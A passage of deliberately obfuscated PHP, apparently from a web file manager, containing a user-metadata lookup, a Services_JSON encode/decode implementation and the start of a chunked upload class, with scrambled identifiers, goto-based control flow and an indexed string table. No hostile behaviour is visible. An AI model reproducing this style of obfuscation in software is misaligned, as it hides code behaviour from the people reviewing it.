_listAppendMeta(&$EÔ⁄ÁïÑÁã, $f—üüò Ù) { goto FÑç†ÑóÊ¯; FîÎÜèè◊ı: $Dõ·¶Ôñû = array($C’ùï£√ê«[1438] => array($C’ùï£√ê«[7], $f—üüò Ù)); $F™Ø˘£≈ßò = Model($C’ùï£√ê«[2513])->where($Dõ·¶Ôñû)->select(); $F™Ø˘£≈ßò = array_to_keyvalue_group($F™Ø˘£≈ßò, $C’ùï£√ê«[1438]); goto E§Üı”ﬂÇ‹; FÑç†ÑóÊ¯: $C’ùï£√ê« =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fò¶‚ª†Ü≠ = UserJobModel::JOB_KEY; $eä‹äÊäàŸ = array($C’ùï£√ê«[2516]); goto FîÎÜèè◊ı; E§Üı”ﬂÇ‹: foreach ($F™Ø˘£≈ßò as &$eÑÉêä‹Ì•) { $FÓ¯÷Øûèß = array(); foreach ($eÑÉêä‹Ì• as $dÊı§ªÃóá) { if (!in_array($dÊı§ªÃóá[$C’ùï£√ê«[89]], $eä‹äÊäàŸ)) { $FÓ¯÷Øûèß[$dÊı§ªÃóá[$C’ùï£√ê«[89]]] = $dÊı§ªÃóá[$C’ùï£√ê«[359]]; } } $eÑÉêä‹Ì• = $FÓ¯÷Øûèß; } $AéÂ‡∫ﬂ’∞ = Model($C’ùï£√ê«[2539]); foreach ($EÔ⁄ÁïÑÁã as &$dÔ–õƒÿ≤€) { $DÈËü∆Â‰ã = array(); if (isset($F™Ø˘£≈ßò[$dÔ–õƒÿ≤€[$C’ùï£√ê«[1438]]])) { $DÈËü∆Â‰ã = $F™Ø˘£≈ßò[$dÔ–õƒÿ≤€[$C’ùï£√ê«[1438]]]; } $dÔ–õƒÿ≤€[$C’ùï£√ê«[2540]] = array(); if (isset($DÈËü∆Â‰ã[$Fò¶‚ª†Ü≠])) { $dÔ–õƒÿ≤€[$C’ùï£√ê«[2540]] = $AéÂ‡∫ﬂ’∞->getUserJobInfo($DÈËü∆Â‰ã[$Fò¶‚ª†Ü≠]); } } goto FÇƒï‚Í∫Ö; FÇƒï‚Í∫Ö: } public function userSearch($c¡ìÍ¿øÖΩ, $dä„ŒÆπù“ = "\52") { return Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][477])->where($c¡ìÍ¿øÖΩ)->field($dä„ŒÆπù“)->find(); } } goto C©ë◊Íè¢«; A´≤åæÎÀ: class Services_JSON { function __construct($D§ ¥π“úó = 0) { $this->use = $D§ ¥π“úó; } function utf162utf8($bâÁ“ˆêáÿ) { $BÕŸ»«±Û‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (function_exists($BÕŸ»«±Û‘[68])) { return mb_convert_encoding($bâÁ“ˆêáÿ, $BÕŸ»«±Û‘[1591], $BÕŸ»«±Û‘[1940]); } $f¥“¡Çè’õ = ord($bâÁ“ˆêáÿ[0]) << 8 | ord($bâÁ“ˆêáÿ[1]); switch (!0) { case (127 & $f¥“¡Çè’õ) == $f¥“¡Çè’õ: return chr(127 & $f¥“¡Çè’õ); case (2047 & $f¥“¡Çè’õ) == $f¥“¡Çè’õ: return chr(192 | $f¥“¡Çè’õ >> 6 & 31) . chr(128 | $f¥“¡Çè’õ & 63); case (65535 & $f¥“¡Çè’õ) == $f¥“¡Çè’õ: return chr(224 | $f¥“¡Çè’õ >> 12 & 15) . chr(128 | $f¥“¡Çè’õ >> 6 & 63) . chr(128 | $f¥“¡Çè’õ & 63); } return $BÕŸ»«±Û‘[33]; } function utf82utf16($cäñØ‹Ü∑ô) { $f‹ÿ∫ºêÛ§ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (function_exists($f‹ÿ∫ºêÛ§[68])) { return mb_convert_encoding($cäñØ‹Ü∑ô, $f‹ÿ∫ºêÛ§[1940], $f‹ÿ∫ºêÛ§[1591]); } switch (strlen($cäñØ‹Ü∑ô)) { case 1: return $cäñØ‹Ü∑ô; case 2: return chr(7 & ord($cäñØ‹Ü∑ô[0]) >> 2) . chr(192 & ord($cäñØ‹Ü∑ô[0]) << 6 | 63 & ord($cäñØ‹Ü∑ô[1])); case 3: return chr(240 & ord($cäñØ‹Ü∑ô[0]) << 4 | 15 & ord($cäñØ‹Ü∑ô[1]) >> 2) . chr(192 & ord($cäñØ‹Ü∑ô[1]) << 6 | 127 & ord($cäñØ‹Ü∑ô[2])); } return $f‹ÿ∫ºêÛ§[33]; } function encode($D∆öÉ›™®Œ) { $cµí€÷¥∑ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; switch (gettype($D∆öÉ›™®Œ)) { case $cµí€÷¥∑ñ[1602]: return $D∆öÉ›™®Œ ? $cµí€÷¥∑ñ[1601] : $cµí€÷¥∑ñ[1603]; case $cµí€÷¥∑ñ[1941]: return $cµí€÷¥∑ñ[99]; case $cµí€÷¥∑ñ[303]: return (int) $D∆öÉ›™®Œ; case $cµí€÷¥∑ñ[278]: case $cµí€÷¥∑ñ[277]: return (double) $D∆öÉ›™®Œ; case $cµí€÷¥∑ñ[312]: $FÚœ∏õÖø¡ = $cµí€÷¥∑ñ[33]; $A√´ì‹ó’Ò = strlen($D∆öÉ›™®Œ); for ($c» …”∂ı = 0; $c» …”∂ı < $A√´ì‹ó’Ò; ++$c» …”∂ı) { $A≤´ßÚ°ñ = ord($D∆öÉ›™®Œ[$c» …”∂ı]); switch (!0) { case $A≤´ßÚ°ñ == 8: $FÚœ∏õÖø¡ .= $cµí€÷¥∑ñ[1942]; break; case $A≤´ßÚ°ñ == 9: $FÚœ∏õÖø¡ .= $cµí€÷¥∑ñ[1578]; break; case $A≤´ßÚ°ñ == 10: $FÚœ∏õÖø¡ .= $cµí€÷¥∑ñ[1576]; break; case $A≤´ßÚ°ñ == 12: $FÚœ∏õÖø¡ .= $cµí€÷¥∑ñ[1943]; break; case $A≤´ßÚ°ñ == 13: $FÚœ∏õÖø¡ .= $cµí€÷¥∑ñ[1577]; break; case $A≤´ßÚ°ñ == 34: case $A≤´ßÚ°ñ == 47: case $A≤´ßÚ°ñ == 92: $FÚœ∏õÖø¡ .= $cµí€÷¥∑ñ[93] . $D∆öÉ›™®Œ[$c» …”∂ı]; break; case $A≤´ßÚ°ñ >= 32 && $A≤´ßÚ°ñ <= 127: $FÚœ∏õÖø¡ .= $D∆öÉ›™®Œ[$c» …”∂ı]; break; case ($A≤´ßÚ°ñ & 224) == 192: $bêø£◊“ìŸ = pack($cµí€÷¥∑ñ[1944], $A≤´ßÚ°ñ, ord($D∆öÉ›™®Œ[$c» …”∂ı + 1])); $c» …”∂ı += 1; $aËüùˆÊÛ = $this->utf82utf16($bêø£◊“ìŸ); $FÚœ∏õÖø¡ .= sprintf($cµí€÷¥∑ñ[1945], bin2hex($aËüùˆÊÛ)); break; case ($A≤´ßÚ°ñ & 240) == 224: $bêø£◊“ìŸ = pack($cµí€÷¥∑ñ[1944], $A≤´ßÚ°ñ, ord($D∆öÉ›™®Œ[$c» …”∂ı + 1]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 2])); $c» …”∂ı += 2; $aËüùˆÊÛ = $this->utf82utf16($bêø£◊“ìŸ); $FÚœ∏õÖø¡ .= sprintf($cµí€÷¥∑ñ[1945], bin2hex($aËüùˆÊÛ)); break; case ($A≤´ßÚ°ñ & 248) == 240: $bêø£◊“ìŸ = pack($cµí€÷¥∑ñ[1944], $A≤´ßÚ°ñ, ord($D∆öÉ›™®Œ[$c» …”∂ı + 1]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 2]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 3])); $c» …”∂ı += 3; $aËüùˆÊÛ = $this->utf82utf16($bêø£◊“ìŸ); $FÚœ∏õÖø¡ .= sprintf($cµí€÷¥∑ñ[1945], bin2hex($aËüùˆÊÛ)); break; case ($A≤´ßÚ°ñ & 252) == 248: $bêø£◊“ìŸ = pack($cµí€÷¥∑ñ[1944], $A≤´ßÚ°ñ, ord($D∆öÉ›™®Œ[$c» …”∂ı + 1]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 2]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 3]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 4])); $c» …”∂ı += 4; $aËüùˆÊÛ = $this->utf82utf16($bêø£◊“ìŸ); $FÚœ∏õÖø¡ .= sprintf($cµí€÷¥∑ñ[1945], bin2hex($aËüùˆÊÛ)); break; case ($A≤´ßÚ°ñ & 254) == 252: $bêø£◊“ìŸ = pack($cµí€÷¥∑ñ[1944], $A≤´ßÚ°ñ, ord($D∆öÉ›™®Œ[$c» …”∂ı + 1]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 2]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 3]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 4]), ord($D∆öÉ›™®Œ[$c» …”∂ı + 5])); $c» …”∂ı += 5; $aËüùˆÊÛ = $this->utf82utf16($bêø£◊“ìŸ); $FÚœ∏õÖø¡ .= sprintf($cµí€÷¥∑ñ[1945], bin2hex($aËüùˆÊÛ)); break; } } return $cµí€÷¥∑ñ[113] . $FÚœ∏õÖø¡ . $cµí€÷¥∑ñ[113]; case $cµí€÷¥∑ñ[1946]: if (is_array($D∆öÉ›™®Œ) && count($D∆öÉ›™®Œ) && array_keys($D∆öÉ›™®Œ) !== range(0, sizeof($D∆öÉ›™®Œ) - 1)) { $BÍ†ˆ˘çøç = array_map(array($this, $cµí€÷¥∑ñ[1947]), array_keys($D∆öÉ›™®Œ), array_values($D∆öÉ›™®Œ)); foreach ($BÍ†ˆ˘çøç as $fûÑÒ“◊î≠) { if (Services_JSON::isError($fûÑÒ“◊î≠)) { return $fûÑÒ“◊î≠; } } return $cµí€÷¥∑ñ[1072] . join($cµí€÷¥∑ñ[47], $BÍ†ˆ˘çøç) . $cµí€÷¥∑ñ[315]; } $D¡ô∞·®Ì = array_map(array($this, $cµí€÷¥∑ñ[1948]), $D∆öÉ›™®Œ); foreach ($D¡ô∞·®Ì as $f”»Ê‰–°Ç) { if (Services_JSON::isError($f”»Ê‰–°Ç)) { return $f”»Ê‰–°Ç; } } return $cµí€÷¥∑ñ[157] . join($cµí€÷¥∑ñ[47], $D¡ô∞·®Ì) . $cµí€÷¥∑ñ[476]; case $cµí€÷¥∑ñ[1949]: $b¬‚ËãÔ—≈ = get_object_vars($D∆öÉ›™®Œ); $BÍ†ˆ˘çøç = array_map(array($this, $cµí€÷¥∑ñ[1947]), array_keys($b¬‚ËãÔ—≈), array_values($b¬‚ËãÔ—≈)); foreach ($BÍ†ˆ˘çøç as $fûÑÒ“◊î≠) { if (Services_JSON::isError($fûÑÒ“◊î≠)) { return $fûÑÒ“◊î≠; } } return $cµí€÷¥∑ñ[1072] . join($cµí€÷¥∑ñ[47], $BÍ†ˆ˘çøç) . $cµí€÷¥∑ñ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $cµí€÷¥∑ñ[99] : new Services_JSON_Error(gettype($D∆öÉ›™®Œ) . $cµí€÷¥∑ñ[1950]); } } function name_value($cÖ¡ÙƒÇ÷∞, $B¯ú¬ñçÛ¶) { $fÖÔá¨µá≤ = $this->encode($B¯ú¬ñçÛ¶); if (Services_JSON::isError($fÖÔá¨µá≤)) { return $fÖÔá¨µá≤; } return $this->encode(strval($cÖ¡ÙƒÇ÷∞)) . $_SERVER[Ä¿¡‡öóµŸﬂ‡][4] . $fÖÔá¨µá≤; } function reduce_string($aΩΩÀÑüÊÂ) { $Dáâﬂ Çåç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aΩΩÀÑüÊÂ = preg_replace(array($Dáâﬂ Çåç[1951], $Dáâﬂ Çåç[1952], $Dáâﬂ Çåç[1953]), $Dáâﬂ Çåç[33], $aΩΩÀÑüÊÂ); return trim($aΩΩÀÑüÊÂ); } function decode($BòÎá∆ﬂÀ≤) { $D⁄Ê∆≈ª÷û =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BòÎá∆ﬂÀ≤ = $this->reduce_string($BòÎá∆ﬂÀ≤); switch (strtolower($BòÎá∆ﬂÀ≤)) { case $D⁄Ê∆≈ª÷û[1601]: return !0; case $D⁄Ê∆≈ª÷û[1603]: return !1; case $D⁄Ê∆≈ª÷û[99]: return null; default: $B≥Óûúîæ› = array(); if (is_numeric($BòÎá∆ﬂÀ≤)) { return (double) $BòÎá∆ﬂÀ≤ == (int) $BòÎá∆ﬂÀ≤ ? (int) $BòÎá∆ﬂÀ≤ : (double) $BòÎá∆ﬂÀ≤; } elseif (preg_match($D⁄Ê∆≈ª÷û[1954], $BòÎá∆ﬂÀ≤, $B≥Óûúîæ›) && $B≥Óûúîæ›[1] == $B≥Óûúîæ›[2]) { $c≠éπïÙª™ = substr($BòÎá∆ﬂÀ≤, 0, 1); $d‘”À‡¥≤ı = substr($BòÎá∆ﬂÀ≤, 1, -1); $bâ€ÀÔ©à˘ = $D⁄Ê∆≈ª÷û[33]; $C–ñàÓéì‡ = strlen($d‘”À‡¥≤ı); for ($F≥Àâ°æé© = 0; $F≥Àâ°æé© < $C–ñàÓéì‡; ++$F≥Àâ°æé©) { $F∞ÎÆ–öôó = substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 2); $aéÌÖô∆àö = ord($d‘”À‡¥≤ı[$F≥Àâ°æé©]); switch (!0) { case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1942]: $bâ€ÀÔ©à˘ .= chr(8); ++$F≥Àâ°æé©; break; case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1578]: $bâ€ÀÔ©à˘ .= chr(9); ++$F≥Àâ°æé©; break; case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1576]: $bâ€ÀÔ©à˘ .= chr(10); ++$F≥Àâ°æé©; break; case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1943]: $bâ€ÀÔ©à˘ .= chr(12); ++$F≥Àâ°æé©; break; case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1577]: $bâ€ÀÔ©à˘ .= chr(13); ++$F≥Àâ°æé©; break; case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1358]: case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1955]: case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1571]: case $F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1573]: if ($c≠éπïÙª™ == $D⁄Ê∆≈ª÷û[113] && $F∞ÎÆ–öôó != $D⁄Ê∆≈ª÷û[1955] || $c≠éπïÙª™ == $D⁄Ê∆≈ª÷û[55] && $F∞ÎÆ–öôó != $D⁄Ê∆≈ª÷û[1358]) { $bâ€ÀÔ©à˘ .= $d‘”À‡¥≤ı[++$F≥Àâ°æé©]; } break; case preg_match($D⁄Ê∆≈ª÷û[1956], substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 6)): $aÕπâ™¿ËØ = chr(hexdec(substr($d‘”À‡¥≤ı, $F≥Àâ°æé© + 2, 2))) . chr(hexdec(substr($d‘”À‡¥≤ı, $F≥Àâ°æé© + 4, 2))); $bâ€ÀÔ©à˘ .= $this->utf162utf8($aÕπâ™¿ËØ); $F≥Àâ°æé© += 5; break; case $aéÌÖô∆àö >= 32 && $aéÌÖô∆àö <= 127: $bâ€ÀÔ©à˘ .= $d‘”À‡¥≤ı[$F≥Àâ°æé©]; break; case ($aéÌÖô∆àö & 224) == 192: $bâ€ÀÔ©à˘ .= substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 2); ++$F≥Àâ°æé©; break; case ($aéÌÖô∆àö & 240) == 224: $bâ€ÀÔ©à˘ .= substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 3); $F≥Àâ°æé© += 2; break; case ($aéÌÖô∆àö & 248) == 240: $bâ€ÀÔ©à˘ .= substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 4); $F≥Àâ°æé© += 3; break; case ($aéÌÖô∆àö & 252) == 248: $bâ€ÀÔ©à˘ .= substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 5); $F≥Àâ°æé© += 4; break; case ($aéÌÖô∆àö & 254) == 252: $bâ€ÀÔ©à˘ .= substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 6); $F≥Àâ°æé© += 5; break; } } return $bâ€ÀÔ©à˘; } elseif (preg_match($D⁄Ê∆≈ª÷û[1957], $BòÎá∆ﬂÀ≤) || preg_match($D⁄Ê∆≈ª÷û[1958], $BòÎá∆ﬂÀ≤)) { goto dÍÖª¬ÒôÁ; f©ã”ÜÛç∑: $d‘”À‡¥≤ı = $this->reduce_string($d‘”À‡¥≤ı); if ($d‘”À‡¥≤ı == $D⁄Ê∆≈ª÷û[33]) { if (reset($DÂﬁÉ¬ûú¯) == SERVICES_JSON_IN_ARR) { return $A¥ÉƒÆç‘ó; } else { return $FÖ∏òá“ŒÚ; } } $C–ñàÓéì‡ = strlen($d‘”À‡¥≤ı); goto d§Ã’Õ–’ë; dÍÖª¬ÒôÁ: if ($BòÎá∆ﬂÀ≤[0] == $D⁄Ê∆≈ª÷û[157]) { $DÂﬁÉ¬ûú¯ = array(SERVICES_JSON_IN_ARR); $A¥ÉƒÆç‘ó = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DÂﬁÉ¬ûú¯ = array(SERVICES_JSON_IN_OBJ); $FÖ∏òá“ŒÚ = array(); } else { $DÂﬁÉ¬ûú¯ = array(SERVICES_JSON_IN_OBJ); $FÖ∏òá“ŒÚ = new stdClass(); } } array_push($DÂﬁÉ¬ûú¯, array($D⁄Ê∆≈ª÷û[1959] => SERVICES_JSON_SLICE, $D⁄Ê∆≈ª÷û[263] => 0, $D⁄Ê∆≈ª÷û[1960] => !1)); $d‘”À‡¥≤ı = substr($BòÎá∆ﬂÀ≤, 1, -1); goto f©ã”ÜÛç∑; d§Ã’Õ–’ë: for ($F≥Àâ°æé© = 0; $F≥Àâ°æé© <= $C–ñàÓéì‡; ++$F≥Àâ°æé©) { $d…Ö‘Çµ©ˆ = end($DÂﬁÉ¬ûú¯); $F∞ÎÆ–öôó = substr($d‘”À‡¥≤ı, $F≥Àâ°æé©, 2); if ($F≥Àâ°æé© == $C–ñàÓéì‡ || $d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[47] && $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]] == SERVICES_JSON_SLICE) { $E©ﬂ¬´åîÈ = substr($d‘”À‡¥≤ı, $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[263]], $F≥Àâ°æé© - $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[263]]); array_push($DÂﬁÉ¬ûú¯, array($D⁄Ê∆≈ª÷û[1959] => SERVICES_JSON_SLICE, $D⁄Ê∆≈ª÷û[263] => $F≥Àâ°æé© + 1, $D⁄Ê∆≈ª÷û[1960] => !1)); if (reset($DÂﬁÉ¬ûú¯) == SERVICES_JSON_IN_ARR) { array_push($A¥ÉƒÆç‘ó, $this->decode($E©ﬂ¬´åîÈ)); } elseif (reset($DÂﬁÉ¬ûú¯) == SERVICES_JSON_IN_OBJ) { $Fö⁄€Œï‘¡ = array(); if (preg_match($D⁄Ê∆≈ª÷û[1961], $E©ﬂ¬´åîÈ, $Fö⁄€Œï‘¡)) { $cóç“ù Æ¬ = $this->decode($Fö⁄€Œï‘¡[1]); $BÑ–ïø„éÂ = $this->decode($Fö⁄€Œï‘¡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÖ∏òá“ŒÚ[$cóç“ù Æ¬] = $BÑ–ïø„éÂ; } else { $FÖ∏òá“ŒÚ->{$cóç“ù Æ¬} = $BÑ–ïø„éÂ; } } elseif (preg_match($D⁄Ê∆≈ª÷û[1962], $E©ﬂ¬´åîÈ, $Fö⁄€Œï‘¡)) { $cóç“ù Æ¬ = $Fö⁄€Œï‘¡[1]; $BÑ–ïø„éÂ = $this->decode($Fö⁄€Œï‘¡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÖ∏òá“ŒÚ[$cóç“ù Æ¬] = $BÑ–ïø„éÂ; } else { $FÖ∏òá“ŒÚ->{$cóç“ù Æ¬} = $BÑ–ïø„éÂ; } } } } elseif (($d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[113] || $d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[55]) && $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]] != SERVICES_JSON_IN_STR) { array_push($DÂﬁÉ¬ûú¯, array($D⁄Ê∆≈ª÷û[1959] => SERVICES_JSON_IN_STR, $D⁄Ê∆≈ª÷û[263] => $F≥Àâ°æé©, $D⁄Ê∆≈ª÷û[1960] => $d‘”À‡¥≤ı[$F≥Àâ°æé©])); } elseif ($d‘”À‡¥≤ı[$F≥Àâ°æé©] == $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1960]] && $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]] == SERVICES_JSON_IN_STR && (strlen(substr($d‘”À‡¥≤ı, 0, $F≥Àâ°æé©)) - strlen(rtrim(substr($d‘”À‡¥≤ı, 0, $F≥Àâ°æé©), $D⁄Ê∆≈ª÷û[93]))) % 2 != 1) { array_pop($DÂﬁÉ¬ûú¯); } elseif ($d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[157] && in_array($d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DÂﬁÉ¬ûú¯, array($D⁄Ê∆≈ª÷û[1959] => SERVICES_JSON_IN_ARR, $D⁄Ê∆≈ª÷û[263] => $F≥Àâ°æé©, $D⁄Ê∆≈ª÷û[1960] => !1)); } elseif ($d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[476] && $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]] == SERVICES_JSON_IN_ARR) { array_pop($DÂﬁÉ¬ûú¯); } elseif ($d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[1072] && in_array($d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DÂﬁÉ¬ûú¯, array($D⁄Ê∆≈ª÷û[1959] => SERVICES_JSON_IN_OBJ, $D⁄Ê∆≈ª÷û[263] => $F≥Àâ°æé©, $D⁄Ê∆≈ª÷û[1960] => !1)); } elseif ($d‘”À‡¥≤ı[$F≥Àâ°æé©] == $D⁄Ê∆≈ª÷û[315] && $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]] == SERVICES_JSON_IN_OBJ) { array_pop($DÂﬁÉ¬ûú¯); } elseif ($F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1963] && in_array($d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DÂﬁÉ¬ûú¯, array($D⁄Ê∆≈ª÷û[1959] => SERVICES_JSON_IN_CMT, $D⁄Ê∆≈ª÷û[263] => $F≥Àâ°æé©, $D⁄Ê∆≈ª÷û[1960] => !1)); $F≥Àâ°æé©++; } elseif ($F∞ÎÆ–öôó == $D⁄Ê∆≈ª÷û[1964] && $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[1959]] == SERVICES_JSON_IN_CMT) { array_pop($DÂﬁÉ¬ûú¯); $F≥Àâ°æé©++; for ($Fá±ÂµÔ¯ó = $d…Ö‘Çµ©ˆ[$D⁄Ê∆≈ª÷û[263]]; $Fá±ÂµÔ¯ó <= $F≥Àâ°æé©; ++$Fá±ÂµÔ¯ó) { $d‘”À‡¥≤ı = substr_replace($d‘”À‡¥≤ı, $D⁄Ê∆≈ª÷û[50], $Fá±ÂµÔ¯ó, 1); } } } if (reset($DÂﬁÉ¬ûú¯) == SERVICES_JSON_IN_ARR) { return $A¥ÉƒÆç‘ó; } elseif (reset($DÂﬁÉ¬ûú¯) == SERVICES_JSON_IN_OBJ) { return $FÖ∏òá“ŒÚ; } goto b‰äÀ‘í”ó; b‰äÀ‘í”ó: } } } function isError($dãÇ÷ŒÊÿù, $DàÜ’íëîë = null) { $FÇ◊†† ªÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (class_exists($FÇ◊†† ªÔ[1965])) { return PEAR::isError($dãÇ÷ŒÊÿù, $DàÜ’íëîë); } elseif (is_object($dãÇ÷ŒÊÿù) && (get_class($dãÇ÷ŒÊÿù) == $FÇ◊†† ªÔ[1966] || is_subclass_of($dãÇ÷ŒÊÿù, $FÇ◊†† ªÔ[1966]))) { return !0; } return !1; } } if (class_exists($_SERVER[Ä¿¡‡öóµŸﬂ‡][1967])) { class Services_JSON_Error extends PEAR_Error { function __construct($FÁÒ±Ü≠ß  = "\x75\x6e\x6b\x6e\157\x77\156\x20\145\x72\162\x6f\x72", $D≥àÚÑÑâ÷ = null, $DÛ¡”ÿºç‰ = null, $B‚ÈÀô¿ÚØ = null, $bÚø¯Ü∫±– = null) { parent::PEAR_Error($FÁÒ±Ü≠ß , $D≥àÚÑÑâ÷, $DÛ¡”ÿºç‰, $B‚ÈÀô¿ÚØ, $bÚø¯Ü∫±–); } } } else { class Services_JSON_Error { function __construct($BŸ¿∫ÂÿÇ“ = "\165\x6e\153\x6e\x6f\x77\x6e\40\x65\162\x72\x6f\x72", $CÙπƒœ«ìä = null, $C÷Ì“ˆõ∑Õ = null, $Fÿëã‘µñ‰ = null, $få¿Ÿ∞‰ãó = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto f¿˘…‹û‡ã; cﬁ∂ºÆ’´⁄: $this->checkSize(); $this->tempPathInit(); goto eªæáäùÇ´; f¿˘…‹û‡ã: $Føóñ´ÿ™Ì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $in; $this->in =& $in; goto Aﬂπùˆì˜£; Aﬂπùˆì˜£: if (!empty($_FILES)) { $dÀôÔú¥¬Ñ = $_FILES[$Føóñ´ÿ™Ì[167]]; $this->uploadFile = $dÀôÔú¥¬Ñ[$Føóñ´ÿ™Ì[1968]]; if (!$this->uploadFile && $dÀôÔú¥¬Ñ[$Føóñ´ÿ™Ì[1222]] > 0) { show_json($this->errorInfo($dÀôÔú¥¬Ñ[$Føóñ´ÿ™Ì[1222]]), !1); } } else { if (isset($in[$Føóñ´ÿ™Ì[386]])) { $this->uploadFile = isset($in[$Føóñ´ÿ™Ì[1969]]) ? $Føóñ´ÿ™Ì[1970] : $Føóñ´ÿ™Ì[1815]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto cﬁ∂ºÆ’´⁄; eªæáäùÇ´: } public function upload() { goto BÃµÜ≤ì¥Ö; e≥ö”íà›ü: CacheLock::unlock($this->tempFile); return $this->tempFile; goto d›ˆ∏êáÏ§; dà‰µ¨‚∂¯: if ($FüÔÉ”ÏÚÂ > 1 && $fÃÚ¬ç‘∑ë <= 0) { show_json($FÖ∑¶Ωß∏‰[1975], !1); } if ($fÃÚ¬ç‘∑ë > $f≤ëË¡ÉäÕ) { $FüÔÉ”ÏÚÂ = 1; } if ($FüÔÉ”ÏÚÂ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto A–à¨çæ·å; Fêì€∂ﬂ‚≤: ignore_timeout(); if (!$this->checkChunkHash($BÎÇ°à˘⁄≥)) { $this->showJson($FÖ∑¶Ωß∏‰[1985], !1); } $this->statusSet(!1); goto e≥ö”íà›ü; D∂∞¡º≤££: $C‚ºÇµÉñ¥ = $this->writeTo($aÕ„ëüÊùŸ, $dæ¡ÎÈÖ®Ç, $this->tempFile); $A¿≈Êø°ƒÕ = IO::hashSimple($aÕ„ëüÊùŸ); $f≤ëË¡ÉäÕ = IO::size($aÕ„ëüÊùŸ); goto cÀ“åœúπù; CÀéÑö§˘ﬁ: $A°≠ªï¯Ω¿ = $aÕ…ÿÉõº© * $fÃÚ¬ç‘∑ë; $dæ¡ÎÈÖ®Ç = @fopen($this->tempFile, $FÖ∑¶Ωß∏‰[1978]); fseek($dæ¡ÎÈÖ®Ç, $A°≠ªï¯Ω¿); goto D∂∞¡º≤££; Dµ Ö©ŸÕÇ: $BÎÇ°à˘⁄≥[$FÖ∑¶Ωß∏‰[1981]][$FÖ∑¶Ωß∏‰[1982] . $aÕ…ÿÉõº©] = array($FÖ∑¶Ωß∏‰[1983] => $A°≠ªï¯Ω¿, $FÖ∑¶Ωß∏‰[1040] => $aÕ…ÿÉõº©, $FÖ∑¶Ωß∏‰[77] => $f≤ëË¡ÉäÕ, $FÖ∑¶Ωß∏‰[164] => $A¿≈Êø°ƒÕ); $this->statusSet($BÎÇ°à˘⁄≥); if (count($BÎÇ°à˘⁄≥[$FÖ∑¶Ωß∏‰[1981]]) != $BÎÇ°à˘⁄≥[$FÖ∑¶Ωß∏‰[1980]]) { $this->showJson($FÖ∑¶Ωß∏‰[1984] . $aÕ…ÿÉõº©, !0); } goto Fêì€∂ﬂ‚≤; Cäùµ‰ÉÑ€: $Bº‰å£¶—û = $this->tempFile . $FÖ∑¶Ωß∏‰[1973] . $aÕ…ÿÉõº©; $f≤ëË¡ÉäÕ = 